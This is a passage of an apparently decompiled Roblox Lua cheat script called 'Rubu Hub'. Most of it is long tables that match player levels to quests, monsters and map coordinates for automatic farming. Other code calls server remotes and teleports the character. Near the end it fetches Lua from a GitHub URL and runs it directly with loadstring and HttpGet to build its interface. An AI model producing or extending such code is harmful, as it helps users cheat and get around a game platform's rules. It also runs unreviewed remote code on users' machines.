            PosQ = CFrame.new(632.698608, 73.1055908, 918.666321, - 0.0319722369, 8.96074881e-10, - 0.999488771, 1.36326533e-10, 1, 8.92172336e-10, 0.999488771, - 1.07732087e-10, - 0.0319722369)
            PosM = CFrame.new(73.078674316406, 81.863441467285, - 27.470672607422)
        elseif v196 == 875 or v196 <= 899 then
            Mon = "Marine Lieutenant"
            Qdata = 1
            Qname = "MarineQuest3"
            NameMon = "Marine Lieutenant"
            PosQ = CFrame.new(- 2440.79639, 71.7140732, - 3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, - 0.500031412, 0, 0.866007268)
            PosM = CFrame.new(- 2821.3723144531, 75.897277832031, - 3070.0891113281)
        elseif v196 == 900 or v196 <= 949 then
            Mon = "Marine Captain"
            Qdata = 2
            Qname = "MarineQuest3"
            NameMon = "Marine Captain"
            PosQ = CFrame.new(- 2440.79639, 71.7140732, - 3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, - 0.500031412, 0, 0.866007268)
            PosM = CFrame.new(- 1861.2310791016, 80.176582336426, - 3254.6975097656)
        elseif v196 == 950 or v196 <= 974 then
            Mon = "Zombie"
            Qdata = 1
            Qname = "ZombieQuest"
            NameMon = "Zombie"
            PosQ = CFrame.new(- 5497.06152, 47.5923004, - 795.237061, - 0.29242146, 0, - 0.95628953, 0, 1, 0, 0.95628953, 0, - 0.29242146)
            PosM = CFrame.new(- 5657.7768554688, 78.969734191895, - 928.68701171875)
        elseif v196 == 975 or v196 <= 999 then
            Mon = "Vampire"
            Qdata = 2
            Qname = "ZombieQuest"
            NameMon = "Vampire"
            PosQ = CFrame.new(- 5497.06152, 47.5923004, - 795.237061, - 0.29242146, 0, - 0.95628953, 0, 1, 0, 0.95628953, 0, - 0.29242146)
            PosM = CFrame.new(- 6037.66796875, 32.184638977051, - 1340.6597900391)
        elseif v196 == 1000 or v196 <= 1049 then
            Mon = "Snow Trooper"
            Qdata = 1
            Qname = "SnowMountainQuest"
            NameMon = "Snow Trooper"
            PosQ = CFrame.new(609.858826, 400.119904, - 5372.25928, - 0.374604106, 0, 0.92718488, 0, 1, 0, - 0.92718488, 0, - 0.374604106)
            PosM = CFrame.new(549.14733886719, 427.38705444336, - 5563.6987304688)
        elseif v196 == 1050 or v196 <= 1099 then
            Mon = "Winter Warrior"
            Qdata = 2
            Qname = "SnowMountainQuest"
            NameMon = "Winter Warrior"
            PosQ = CFrame.new(609.858826, 400.119904, - 5372.25928, - 0.374604106, 0, 0.92718488, 0, 1, 0, - 0.92718488, 0, - 0.374604106)
            PosM = CFrame.new(1142.7451171875, 475.63980102539, - 5199.4165039062)
        elseif v196 == 1100 or v196 <= 1124 then
            Mon = "Lab Subordinate"
            Qdata = 1
            Qname = "IceSideQuest"
            NameMon = "Lab Subordinate"
            PosQ = CFrame.new(- 6064.06885, 15.2422857, - 4902.97852, 0.453972578, 0, - 0.891015649, 0, 1, 0, 0.891015649, 0, 0.453972578)
            PosM = CFrame.new(- 5707.4716796875, 15.951709747314, - 4513.3920898438)
        elseif v196 == 1125 or v196 <= 1174 then
            Mon = "Horned Warrior"
            Qdata = 2
            Qname = "IceSideQuest"
            NameMon = "Horned Warrior"
            PosQ = CFrame.new(- 6064.06885, 15.2422857, - 4902.97852, 0.453972578, 0, - 0.891015649, 0, 1, 0, 0.891015649, 0, 0.453972578)
            PosM = CFrame.new(- 6341.3666992188, 15.951770782471, - 5723.162109375)
        elseif v196 == 1175 or v196 <= 1199 then
            Mon = "Magma Ninja"
            Qdata = 1
            Qname = "FireSideQuest"
            NameMon = "Magma Ninja"
            PosQ = CFrame.new(- 5428.03174, 15.0622921, - 5299.43457, - 0.882952213, 0, 0.469463557, 0, 1, 0, - 0.469463557, 0, - 0.882952213)
            PosM = CFrame.new(- 5449.6728515625, 76.658744812012, - 5808.2006835938)
        elseif v196 == 1200 or v196 <= 1249 then
            Mon = "Lava Pirate"
            Qdata = 2
            Qname = "FireSideQuest"
            NameMon = "Lava Pirate"
            PosQ = CFrame.new(- 5428.03174, 15.0622921, - 5299.43457, - 0.882952213, 0, 0.469463557, 0, 1, 0, - 0.469463557, 0, - 0.882952213)
            PosM = CFrame.new(- 5213.3315429688, 49.737880706787, - 4701.451171875)
        elseif v196 == 1250 or v196 <= 1274 then
            Mon = "Ship Deckhand"
            Qdata = 1
            Qname = "ShipQuest1"
            NameMon = "Ship Deckhand"
            PosQ = CFrame.new(1037.80127, 125.092171, 32911.6016)
            PosM = CFrame.new(1212.0111083984, 150.79205322266, 33059.24609375)
            if _G.Level and (PosQ.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
            end
        elseif v196 == 1275 or v196 <= 1299 then
            Mon = "Ship Engineer"
            Qdata = 2
            Qname = "ShipQuest1"
            NameMon = "Ship Engineer"
            PosQ = CFrame.new(1037.80127, 125.092171, 32911.6016)
            PosM = CFrame.new(919.47863769531, 43.544013977051, 32779.96875)
            if _G.Level and (PosQ.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
            end
        elseif v196 == 1300 or v196 <= 1324 then
            Mon = "Ship Steward"
            Qdata = 1
            Qname = "ShipQuest2"
            NameMon = "Ship Steward"
            PosQ = CFrame.new(968.80957, 125.092171, 33244.125)
            PosM = CFrame.new(919.43853759766, 129.55599975586, 33436.03515625)
            if _G.Level and (PosQ.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
            end
        elseif v196 == 1325 or v196 <= 1349 then
            Mon = "Ship Officer"
            Qdata = 2
            Qname = "ShipQuest2"
            NameMon = "Ship Officer"
            PosQ = CFrame.new(968.80957, 125.092171, 33244.125)
            PosM = CFrame.new(1036.0179443359, 181.4390411377, 33315.7265625)
            if _G.Level and (PosQ.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
            end
        elseif v196 == 1350 or v196 <= 1374 then
            Mon = "Arctic Warrior"
            Qdata = 1
            Qname = "FrostQuest"
            NameMon = "Arctic Warrior"
            PosQ = CFrame.new(5667.6582, 26.7997818, - 6486.08984, - 0.933587909, 0, - 0.358349502, 0, 1, 0, 0.358349502, 0, - 0.933587909)
            PosM = CFrame.new(5966.24609375, 62.970020294189, - 6179.3828125)
            if _G.Level and (PosQ.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                BTP(PosM)
            end
        elseif v196 == 1375 or v196 <= 1424 then
            Mon = "Snow Lurker"
            Qdata = 2
            Qname = "FrostQuest"
            NameMon = "Snow Lurker"
            PosQ = CFrame.new(5667.6582, 26.7997818, - 6486.08984, - 0.933587909, 0, - 0.358349502, 0, 1, 0, 0.358349502, 0, - 0.933587909)
            PosM = CFrame.new(5407.0737304688, 69.194374084473, - 6880.8803710938)
        elseif v196 == 1425 or v196 <= 1449 then
            Mon = "Sea Soldier"
            Qdata = 1
            Qname = "ForgottenQuest"
            NameMon = "Sea Soldier"
            PosQ = CFrame.new(- 3054.44458, 235.544281, - 10142.8193, 0.990270376, 0, - 0.13915664, 0, 1, 0, 0.13915664, 0, 0.990270376)
            PosM = CFrame.new(- 3028.2236328125, 64.674514770508, - 9775.4267578125)
        elseif v196 >= 1450 then
            Mon = "Water Fighter"
            Qdata = 2
            Qname = "ForgottenQuest"
            NameMon = "Water Fighter"
            PosQ = CFrame.new(- 3054.44458, 235.544281, - 10142.8193, 0.990270376, 0, - 0.13915664, 0, 1, 0, 0.13915664, 0, 0.990270376)
            PosM = CFrame.new(- 3352.9013671875, 285.01556396484, - 10534.841796875)
        end
    elseif World3 then
        if v196 == 1500 or v196 <= 1524 then
            Mon = "Pirate Millionaire"
            Qdata = 1
            Qname = "PiratePortQuest"
            NameMon = "Pirate Millionaire"
            PosQ = CFrame.new(- 712.82727050781, 98.577049255371, 5711.9541015625)
            PosM = CFrame.new(- 712.82727050781, 98.577049255371, 5711.9541015625)
        elseif v196 == 1525 or v196 <= 1574 then
            Mon = "Pistol Billionaire"
            Qdata = 2
            Qname = "PiratePortQuest"
            NameMon = "Pistol Billionaire"
            PosQ = CFrame.new(- 723.43316650391, 147.42906188965, 5931.9931640625)
            PosM = CFrame.new(- 723.43316650391, 147.42906188965, 5931.9931640625)
        elseif v196 == 1575 or v196 <= 1599 then
            Mon = "Dragon Crew Warrior"
            Qdata = 1
            Qname = "AmazonQuest"
            NameMon = "Dragon Crew Warrior"
            PosQ = CFrame.new(6779.0327148438, 111.16865539551, - 801.21307373047)
            PosM = CFrame.new(6779.0327148438, 111.16865539551, - 801.21307373047)
        elseif v196 == 1600 or v196 <= 1624 then
            Mon = "Dragon Crew Archer"
            Qname = "AmazonQuest"
            Qdata = 2
            NameMon = "Dragon Crew Archer"
            PosQ = CFrame.new(6955.8974609375, 546.66589355469, 309.04013061523)
            PosM = CFrame.new(6955.8974609375, 546.66589355469, 309.04013061523)
        elseif v196 == 1625 or v196 <= 1649 then
            Mon = "Hydra Enforcer"
            Qname = "VenomCrewQuest"
            Qdata = 1
            NameMon = "Hydra Enforcer"
            PosQ = CFrame.new(4620.6157226562, 1002.2954711914, 399.08688354492)
            PosM = CFrame.new(4620.6157226562, 1002.2954711914, 399.08688354492)
        elseif v196 == 1650 or v196 <= 1699 then
            Mon = "Venomous Assailant"
            Qname = "VenomCrewQuest"
            Qdata = 2
            NameMon = "Venomous Assailant"
            PosQ = CFrame.new(4697.5918, 1100.65137, 946.401978, 0.579397917, - 4.19689783e-10, 0.81504482, - 1.49287818e-10, 1, 6.21053986e-10, - 0.81504482, - 4.81513662e-10, 0.579397917)
            PosM = CFrame.new(4697.5918, 1100.65137, 946.401978, 0.579397917, - 4.19689783e-10, 0.81504482, - 1.49287818e-10, 1, 6.21053986e-10, - 0.81504482, - 4.81513662e-10, 0.579397917)
        elseif v196 == 1700 or v196 <= 1724 then
            Mon = "Marine Commodore"
            Qdata = 1
            Qname = "MarineTreeIsland"
            NameMon = "Marine Commodore"
            PosQ = CFrame.new(2180.54126, 27.8156815, - 6741.5498, - 0.965929747, 0, 0.258804798, 0, 1, 0, - 0.258804798, 0, - 0.965929747)
            PosM = CFrame.new(2286.0078125, 73.133918762207, - 7159.8090820312)
        elseif v196 == 1725 or v196 <= 1774 then
            Mon = "Marine Rear Admiral"
            NameMon = "Marine Rear Admiral"
            Qname = "MarineTreeIsland"
            Qdata = 2
            PosQ = CFrame.new(2179.98828125, 28.731239318848, - 6740.0551757813)
            PosM = CFrame.new(3656.7736816406, 160.52406311035, - 7001.5986328125)
        elseif v196 == 1775 or v196 <= 1799 then
            Mon = "Fishman Raider"
            Qdata = 1
            Qname = "DeepForestIsland3"
            NameMon = "Fishman Raider"
            PosQ = CFrame.new(- 10581.6563, 330.872955, - 8761.18652, - 0.882952213, 0, 0.469463557, 0, 1, 0, - 0.469463557, 0, - 0.882952213)
            PosM = CFrame.new(- 10407.526367188, 331.76263427734, - 8368.5166015625)
        elseif v196 == 1800 or v196 <= 1824 then
            Mon = "Fishman Captain"
            Qdata = 2
            Qname = "DeepForestIsland3"
            NameMon = "Fishman Captain"
            PosQ = CFrame.new(- 10581.6563, 330.872955, - 8761.18652, - 0.882952213, 0, 0.469463557, 0, 1, 0, - 0.469463557, 0, - 0.882952213)
            PosM = CFrame.new(- 10994.701171875, 352.38140869141, - 9002.1103515625)
        elseif v196 == 1825 or v196 <= 1849 then
            Mon = "Forest Pirate"
            Qdata = 1
            Qname = "DeepForestIsland"
            NameMon = "Forest Pirate"
            PosQ = CFrame.new(- 13234.04, 331.488495, - 7625.40137, 0.707134247, 0, - 0.707079291, 0, 1, 0, 0.707079291, 0, 0.707134247)
            PosM = CFrame.new(- 13274.478515625, 332.37814331055, - 7769.5805664062)
        elseif v196 == 1850 or v196 <= 1899 then
            Mon = "Mythological Pirate"
            Qdata = 2
            Qname = "DeepForestIsland"
            NameMon = "Mythological Pirate"
            PosQ = CFrame.new(- 13234.04, 331.488495, - 7625.40137, 0.707134247, 0, - 0.707079291, 0, 1, 0, 0.707079291, 0, 0.707134247)
            PosM = CFrame.new(- 13680.607421875, 501.08154296875, - 6991.189453125)
        elseif v196 == 1900 or v196 <= 1924 then
            Mon = "Jungle Pirate"
            Qdata = 1
            Qname = "DeepForestIsland2"
            NameMon = "Jungle Pirate"
            PosQ = CFrame.new(- 12680.3818, 389.971039, - 9902.01953, - 0.0871315002, 0, 0.996196866, 0, 1, 0, - 0.996196866, 0, - 0.0871315002)
            PosM = CFrame.new(- 12256.16015625, 331.73828125, - 10485.836914062)
        elseif v196 == 1925 or v196 <= 1974 then
            Mon = "Musketeer Pirate"
            Qdata = 2
            Qname = "DeepForestIsland2"
            NameMon = "Musketeer Pirate"
            PosQ = CFrame.new(- 12680.3818, 389.971039, - 9902.01953, - 0.0871315002, 0, 0.996196866, 0, 1, 0, - 0.996196866, 0, - 0.0871315002)
            PosM = CFrame.new(- 13457.904296875, 391.54565429688, - 9859.177734375)
        elseif v196 == 1975 or v196 <= 1999 then
            Mon = "Reborn Skeleton"
            Qdata = 1
            Qname = "HauntedQuest1"
            NameMon = "Reborn Skeleton"
            PosQ = CFrame.new(- 9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, 0, - 1, 0, 0)
            PosM = CFrame.new(- 8763.7236328125, 165.72299194336, 6159.8618164062)
        elseif v196 == 2000 or v196 <= 2024 then
            Mon = "Living Zombie"
            Qdata = 2
            Qname = "HauntedQuest1"
            NameMon = "Living Zombie"
            PosQ = CFrame.new(- 9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, 0, - 1, 0, 0)
            PosM = CFrame.new(- 10144.131835938, 138.6266784668, 5838.0888671875)
        elseif v196 == 2025 or v196 <= 2049 then
            Mon = "Demonic Soul"
            Qdata = 1
            Qname = "HauntedQuest2"
            NameMon = "Demonic Soul"
            PosQ = CFrame.new(- 9516.99316, 172.017181, 6078.46533, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
            PosM = CFrame.new(- 9505.8720703125, 172.10482788086, 6158.9931640625)
        elseif v196 == 2050 or v196 <= 2074 then
            Mon = "Posessed Mummy"
            Qdata = 2
            Qname = "HauntedQuest2"
            NameMon = "Posessed Mummy"
            PosQ = CFrame.new(- 9516.99316, 172.017181, 6078.46533, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
            PosM = CFrame.new(- 9582.0224609375, 6.2515273094177, 6205.478515625)
        elseif v196 == 2075 or v196 <= 2099 then
            Mon = "Peanut Scout"
            Qdata = 1
            Qname = "NutsIslandQuest"
            NameMon = "Peanut Scout"
            PosQ = CFrame.new(- 2104.3908691406, 38.104167938232, - 10194.21875, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
            PosM = CFrame.new(- 2143.2419433594, 47.721984863281, - 10029.995117188)
        elseif v196 == 2100 or v196 <= 2124 then
            Mon = "Peanut President"
            Qdata = 2
            Qname = "NutsIslandQuest"
            NameMon = "Peanut President"
            PosQ = CFrame.new(- 2104.3908691406, 38.104167938232, - 10194.21875, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
            PosM = CFrame.new(- 1859.3540039062, 38.103168487549, - 10422.4296875)
        elseif v196 == 2125 or v196 <= 2149 then
            Mon = "Ice Cream Chef"
            Qdata = 1
            Qname = "IceCreamIslandQuest"
            NameMon = "Ice Cream Chef"
            PosQ = CFrame.new(- 820.64825439453, 65.819526672363, - 10965.795898438, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
            PosM = CFrame.new(- 872.24658203125, 65.81957244873, - 10919.95703125)
        elseif v196 == 2150 or v196 <= 2199 then
            Mon = "Ice Cream Commander"
            Qdata = 2
            Qname = "IceCreamIslandQuest"
            NameMon = "Ice Cream Commander"
            PosQ = CFrame.new(- 820.64825439453, 65.819526672363, - 10965.795898438, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
            PosM = CFrame.new(- 558.06103515625, 112.04895782471, - 11290.774414062)
        elseif v196 == 2200 or v196 <= 2224 then
            Mon = "Cookie Crafter"
            Qdata = 1
            Qname = "CakeQuest1"
            NameMon = "Cookie Crafter"
            PosQ = CFrame.new(- 2021.32007, 37.7982254, - 12028.7295, 0.957576931, - 8.80302053e-8, 0.288177818, 6.9301187e-8, 1, 7.51931211e-8, - 0.288177818, - 5.2032135e-8, 0.957576931)
            PosM = CFrame.new(- 2374.13671875, 37.798263549805, - 12125.30859375)
        elseif v196 == 2225 or v196 <= 2249 then
            Mon = "Cake Guard"
            Qdata = 2
            Qname = "CakeQuest1"
            NameMon = "Cake Guard"
            PosQ = CFrame.new(- 2021.32007, 37.7982254, - 12028.7295, 0.957576931, - 8.80302053e-8, 0.288177818, 6.9301187e-8, 1, 7.51931211e-8, - 0.288177818, - 5.2032135e-8, 0.957576931)
            PosM = CFrame.new(- 1598.3070068359, 43.773197174072, - 12244.581054688)
        elseif v196 == 2250 or v196 <= 2274 then
            Mon = "Baking Staff"
            Qdata = 1
            Qname = "CakeQuest2"
            NameMon = "Baking Staff"
            PosQ = CFrame.new(- 1927.91602, 37.7981339, - 12842.5391, - 0.96804446, 4.22142143e-8, 0.250778586, 4.74911062e-8, 1, 1.49904711e-8, - 0.250778586, 2.64211941e-8, - 0.96804446)
            PosM = CFrame.new(- 1887.8099365234, 77.618507385254, - 12998.350585938)
        elseif v196 == 2275 or v196 <= 2299 then
            Mon = "Head Baker"
            Qdata = 2
            Qname = "CakeQuest2"
            NameMon = "Head Baker"
            PosQ = CFrame.new(- 1927.91602, 37.7981339, - 12842.5391, - 0.96804446, 4.22142143e-8, 0.250778586, 4.74911062e-8, 1, 1.49904711e-8, - 0.250778586, 2.64211941e-8, - 0.96804446)
            PosM = CFrame.new(- 2216.1882324219, 82.884521484375, - 12869.293945312)
        elseif v196 == 2300 or v196 <= 2324 then
            Mon = "Cocoa Warrior"
            Qdata = 1
            Qname = "ChocQuest1"
            NameMon = "Cocoa Warrior"
            PosQ = CFrame.new(233.22836303711, 29.876001358032, - 12201.233398438)
            PosM = CFrame.new(- 21.553283691406, 80.574996948242, - 12352.387695312)
        elseif v196 == 2325 or v196 <= 2349 then
            Mon = "Chocolate Bar Battler"
            Qdata = 2
            Qname = "ChocQuest1"
            NameMon = "Chocolate Bar Battler"
            PosQ = CFrame.new(233.22836303711, 29.876001358032, - 12201.233398438)
            PosM = CFrame.new(582.59057617188, 77.188095092773, - 12463.162109375)
        elseif v196 == 2350 or v196 <= 2374 then
            Mon = "Sweet Thief"
            Qdata = 1
            Qname = "ChocQuest2"
            NameMon = "Sweet Thief"
            PosQ = CFrame.new(150.50663757324, 30.693693161011, - 12774.502929688)
            PosM = CFrame.new(165.1884765625, 76.058853149414, - 12600.836914062)
        elseif v196 == 2375 or v196 <= 2399 then
            Mon = "Candy Rebel"
            Qdata = 2
            Qname = "ChocQuest2"
            NameMon = "Candy Rebel"
            PosQ = CFrame.new(150.50663757324, 30.693693161011, - 12774.502929688)
            PosM = CFrame.new(134.86563110352, 77.247680664062, - 12876.547851562)
        elseif v196 == 2400 or v196 <= 2449 then
            Mon = "Candy Pirate"
            Qdata = 1
            Qname = "CandyQuest1"
            NameMon = "Candy Pirate"
            PosQ = CFrame.new(- 1150.0400390625, 20.378934860229, - 14446.334960938)
            PosM = CFrame.new(- 1310.5003662109, 26.016523361206, - 14562.404296875)
        elseif v196 == 2450 or v196 <= 2474 then
            Mon = "Isle Outlaw"
            Qdata = 1
            Qname = "TikiQuest1"
            NameMon = "Isle Outlaw"
            PosQ = CFrame.new(- 16548.8164, 55.6059914, - 172.8125, 0.213092566, 0, - 0.977032006, 0, 1, 0, 0.977032006, 0, 0.213092566)
            PosM = CFrame.new(- 16479.900390625, 226.6117401123, - 300.31143188477)
        elseif v196 == 2475 or v196 <= 2499 then
            Mon = "Island Boy"
            Qdata = 2
            Qname = "TikiQuest1"
            NameMon = "Island Boy"
            PosQ = CFrame.new(- 16548.8164, 55.6059914, - 172.8125, 0.213092566, 0, - 0.977032006, 0, 1, 0, 0.977032006, 0, 0.213092566)
            PosM = CFrame.new(- 16849.396484375, 192.86505126953, - 150.78532409668)
        elseif v196 == 2500 or v196 <= 2524 then
            Mon = "Sun-kissed Warrior"
            Qdata = 1
            Qname = "TikiQuest2"
            NameMon = "kissed Warrior"
            PosM = CFrame.new(- 16347, 64, 984)
            PosQ = CFrame.new(- 16538, 55, 1049)
        elseif v196 == 2525 or v196 <= 2550 then
            Mon = "Isle Champion"
            Qdata = 2
            Qname = "TikiQuest2"
            NameMon = "Isle Champion"
            PosQ = CFrame.new(- 16541.0215, 57.3082275, 1051.46118, 0.0410757065, 0, - 0.999156058, 0, 1, 0, 0.999156058, 0, 0.0410757065)
            PosM = CFrame.new(- 16602.1015625, 130.38734436035, 1087.2456054688)
        elseif v196 == 2551 or v196 <= 2574 then
            Mon = "Serpent Hunter"
            Qdata = 1
            Qname = "TikiQuest3"
            NameMon = "Serpent Hunter"
            PosQ = CFrame.new(- 16679.478515625, 176.74737548828, 1474.3995361328)
            PosM = CFrame.new(- 16679.478515625, 176.74737548828, 1474.3995361328)
        elseif v196 >= 2575 then
            Mon = "Skull Slayer"
            Qdata = 2
            Qname = "TikiQuest3"
            NameMon = "Skull Slayer"
            PosQ = CFrame.new(- 16759.58984375, 71.283767700195, 1595.3399658203)
            PosM = CFrame.new(- 16759.58984375, 71.283767700195, 1595.3399658203)
        end
    end
end
function MaterialMon()
    local v197 = game.Players.LocalPlayer
    local vu198 = v197.Character
    if vu198 then
        vu198 = v197.Character:FindFirstChild("HumanoidRootPart")
    end
    if vu198 then
        function shouldRequestEntrance(p199, p200)
			-- upvalues: (ref) vu198
            if p200 <= (vu198.Position - p199).Magnitude then
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", p199)
            end
        end
        if World1 then
            if SelectMaterial ~= "Angel Wings" then
                if SelectMaterial ~= "Leather + Scrap Metal" then
                    if SelectMaterial ~= "Magma Ore" then
                        if SelectMaterial == "Fish Tail" then
                            MMon = {
                                "Fishman Warrior",
                                "Fishman Commando",
                                "Fishman Lord"
                            }
                            MPos = CFrame.new(61123, 19, 1569)
                            SP = "Default"
                            local v201 = Vector3.new(61163.8515625, 5.342342376709, 1819.7841796875)
                            shouldRequestEntrance(v201, 17000)
                        end
                    else
                        MMon = {
                            "Military Soldier",
                            "Military Spy",
                            "Magma Admiral"
                        }
                        MPos = CFrame.new(- 5815, 84, 8820)
                        SP = "Default"
                    end
                else
                    MMon = {
                        "Brute",
                        "Pirate"
                    }
                    MPos = CFrame.new(- 1145, 15, 4350)
                    SP = "Default"
                end
            else
                MMon = {
                    "Shanda",
                    "Royal Squad",
                    "Royal Soldier",
                    "Wysper",
                    "Thunder God"
                }
                MPos = CFrame.new(- 4698, 845, - 1912)
                SP = "Default"
                local v202 = Vector3.new(- 4607.82275, 872.54248, - 1667.55688)
                shouldRequestEntrance(v202, 10000)
            end
        elseif World2 then
            if SelectMaterial ~= "Leather + Scrap Metal" then
                if SelectMaterial ~= "Magma Ore" then
                    if SelectMaterial ~= "Ectoplasm" then
                        if SelectMaterial ~= "Mystic Droplet" then
                            if SelectMaterial ~= "Radioactive Material" then
                                if SelectMaterial == "Vampire Fang" then
                                    MMon = {
                                        "Vampire"
                                    }
                                    MPos = CFrame.new(- 6033, 7, - 1317)
                                    SP = "Default"
                                end
                            else
                                MMon = {
                                    "Factory Staff"
                                }
                                MPos = CFrame.new(295, 73, - 56)
                                SP = "Default"
                            end
                        else
                            MMon = {
                                "Water Fighter"
                            }
                            MPos = CFrame.new(- 3385, 239, - 10542)
                            SP = "Default"
                        end
                    else
                        MMon = {
                            "Ship Deckhand",
                            "Ship Engineer",
                            "Ship Steward",
                            "Ship Officer"
                        }
                        MPos = CFrame.new(911.35827636719, 125.95812988281, 33159.5390625)
                        SP = "Default"
                        local v203 = Vector3.new(61163.8515625, 5.342342376709, 1819.7841796875)
                        shouldRequestEntrance(v203, 18000)
                    end
                else
                    MMon = {
                        "Magma Ninja",
                        "Lava Pirate"
                    }
                    MPos = CFrame.new(- 5428, 78, - 5959)
                    SP = "Default"
                end
            else
                MMon = {
                    "Marine Captain"
                }
                MPos = CFrame.new(- 2010.5059814453, 73.001159667969, - 3326.6208496094)
                SP = "Default"
            end
        elseif World3 then
            if SelectMaterial ~= "Scrap Metal" then
                if SelectMaterial ~= "Fish Tail" then
                    if SelectMaterial ~= "Conjured Cocoa" then
                        if SelectMaterial ~= "Dragon Scale" then
                            if SelectMaterial ~= "Gunpowder" then
                                if SelectMaterial ~= "Mini Tusk" then
                                    if SelectMaterial == "Demonic Wisp" then
                                        MMon = {
                                            "Demonic Soul"
                                        }
                                        MPos = CFrame.new(- 9495.6806640625, 453.58624267578, 5977.3486328125)
                                        SP = "Default"
                                    end
                                else
                                    MMon = {
                                        "Mythological Pirate"
                                    }
                                    MPos = CFrame.new(- 13545, 470, - 6917)
                                    SP = "Default"
                                end
                            else
                                MMon = {
                                    "Pistol Billionaire"
                                }
                                MPos = CFrame.new(- 84.855690002441, 85.620613098145, 6132.0087890625)
                                SP = "Default"
                            end
                        else
                            MMon = {
                                "Dragon Crew Archer",
                                "Dragon Crew Warrior"
                            }
                            MPos = CFrame.new(6594, 383, 139)
                            SP = "Default"
                        end
                    else
                        MMon = {
                            "Chocolate Bar Battler",
                            "Cocoa Warrior"
                        }
                        MPos = CFrame.new(620.63446044922, 78.936447143555, - 12581.369140625)
                        SP = "Default"
                    end
                else
                    MMon = {
                        "Fishman Raider",
                        "Fishman Captain"
                    }
                    MPos = CFrame.new(- 10993, 332, - 8940)
                    SP = "Default"
                end
            else
                MMon = {
                    "Jungle Pirate",
                    "Forest Pirate"
                }
                MPos = CFrame.new(- 11975.78515625, 331.77340698242, - 10620.030273438)
                SP = "Default"
            end
        end
    end
end
function QuestNeta()
    QuestCheck()
    return {
        Mon,
        Qdata,
        Qname,
        PosM,
        NameMon,
        PosQ
    }
end
local v224 = (function()
    local vu204 = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    return {
        ["CreateWindow"] = function(_, p205)
			-- upvalues: (ref) vu204
            local v206 = {}
            local vu207 = vu204:CreateWindow({
                ["Title"] = p205.Title,
                ["Author"] = p205.SubTitle,
                ["Folder"] = "Noguchi",
                ["Size"] = p205.Size or UDim2.fromOffset(580, 460),
                ["Transparent"] = true,
                ["Theme"] = "Dark",
                ["SideBarWidth"] = 200,
                ["HideSearchBar"] = true,
                ["ScrollBarEnabled"] = false
            })
            function v206.Notify(_, p208)
				-- upvalues: (ref) vu204
                vu204:Popup({
                    ["Title"] = p208.Title,
                    ["Content"] = p208.Content
                })
            end
            function v206.AddTab(_, p209)
				-- upvalues: (ref) vu207
                local v210 = {}
                local vu211 = vu207:Tab({
                    ["Title"] = p209.Title
                })
                function v210.AddParagraph(_, p212)
					-- upvalues: (ref) vu211
                    return vu211:Paragraph({
                        ["Title"] = p212.Title,
                        ["Desc"] = p212.Content
                    })
                end
                function v210.AddToggle(_, _, pu213)
					-- upvalues: (ref) vu211
                    return {
                        ["OnChanged"] = function(_, p214)
							-- upvalues: (ref) vu211, (ref) pu213
                            vu211:Toggle({
                                ["Title"] = pu213.Title,
                                ["Desc"] = pu213.Description,
                                ["Default"] = pu213.Default or true,
                                ["Callback"] = p214
                            })
                        end
                    }
                end
                function v210.AddDropdown(_, _, pu215)
					-- upvalues: (ref) vu211
                    return {
                        ["OnChanged"] = function(_, p216)
							-- upvalues: (ref) vu211, (ref) pu215
                            vu211:Dropdown({
                                ["Title"] = pu215.Title,
                                ["Values"] = pu215.Values,
                                ["Value"] = typeof(pu215.Default) == "number" and pu215.Values[pu215.Default] or pu215.Default,
                                ["Multi"] = pu215.Multi,
                                ["Callback"] = p216
                            })
                        end
                    }
                end
                function v210.AddButton(_, p217)
					-- upvalues: (ref) vu211
                    vu211:Button({
                        ["Title"] = p217.Title,
                        ["Desc"] = p217.Description,
                        ["Callback"] = p217.Callback
                    })
                end
                function v210.AddSection(_, p218)
					-- upvalues: (ref) vu211
                    vu211:Section({
                        ["Title"] = p218,
                        ["TextXAlignment"] = "Left",
                        ["TextSize"] = 17
                    })
                end
                function v210.AddSlider(_, _, p219)
					-- upvalues: (ref) vu211
                    local v220 = vu211
                    local v221 = v220.Slider
                    local v222 = {
                        ["Title"] = p219.Title,
                        ["Step"] = p219.Rounding,
                        ["Value"] = {
                            ["Min"] = p219.Min,
                            ["Max"] = p219.Max,
                            ["Default"] = p219.Default
                        },
                        ["Callback"] = p219.Callback
                    }
                    return v221(v220, v222)
                end
                function v210.AddInput(_, _, p223)
					-- upvalues: (ref) vu211
                    vu211:Input({
                        ["Title"] = p223.Title,
                        ["Value"] = p223.Default,
                        ["Type"] = "Input",
                        ["Placeholder"] = p223.Placeholder,
                        ["Callback"] = p223.Callback
                    })
                end
                return v210
            end
            return v206
        end
    }
end)():CreateWindow({
    ["Title"] = "Rubu Hub",
    ["SubTitle"] = " | by @RuBuTV_Roblox",
    ["TabWidth"] = 155,
    ["Size"] = UDim2.fromOffset(555, 320),
    ["Acrylic"] = false,
    ["Theme"] = "Darker",
    ["MinimizeKey"] = Enum.KeyCode.End
})
local v225 = v224:AddTab({
    ["Title"] = "Info",
    ["Icon"] = ""
})
v225:AddParagraph({
